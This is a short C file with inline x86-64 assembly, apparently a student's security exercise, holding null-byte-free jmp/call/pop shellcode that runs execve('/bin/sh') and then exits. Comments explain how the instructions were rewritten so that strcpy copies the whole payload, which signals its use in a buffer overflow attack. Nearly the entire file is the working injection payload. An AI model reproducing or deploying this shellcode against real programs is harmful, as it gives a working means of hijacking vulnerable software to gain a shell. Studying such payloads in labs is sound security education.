#include <stdio.h>

/*
altered assembly instructions, so that there are no \x00 bytes in between to that strcpy(buffer, code) can copy the whole buffer
*/

/*
Changed lines:

		"movb $0x0,0x7(%rbx);"
		"movq $0x0,0x10(%rbx);" 
		"movl $0x0,%edx"
		"movb $0x3b,%eax"
		"movb $ox3c,%eax"
*/
void main(){


	__asm__(
		"jmp call_label;" //jump to call
		"pop_label:		;"
		"popq %rbx;" //call wil jump to here, making rip the addr of string, which will be on the stack so I can just pop it - rbx now has address of bin/sh string.
		"movq %rbx,0x8(%rbx);" //move the address to 8 bytes after whatever rbx is pointing to it's pointing to a string with 7 chars with one \0 char at the end so 8 bytes in total
		"xorq %rax, %rax;"
		"movb %al, 0x7(%rbx);"
		"movq %rax, 0x10(%rbx);"
		"xorl %edx,%edx;" // edx needs to have 0x0 for execve (look at __execve in gdb for shell.c)
		"leaq 0x8(%rbx),%rsi;" //rsi needs to contain the address that points to the address of the string of the file name followed by NULL ptr
		"movq %rbx,%rdi;" //rdi needs to contain the address of the string
		//now for execve i need to mov 0x3b in to eax and do a syscall
		"xorl %eax, %eax;"
		"movb $0x3b,%al;"
		"syscall;"
		//for exit i need to mov 0x3c into eax and do a syscall
		"xorl %eax, %eax;"
		"movb $0x3c,%al;"
		"syscall;"
		"call_label:	;"
		"call pop_label;" // this is exactly like calling a function, this pshes the next ip to the stack which in our case is just a pointer to this string
		".asciz \"/bin/sh\";"
		);
}
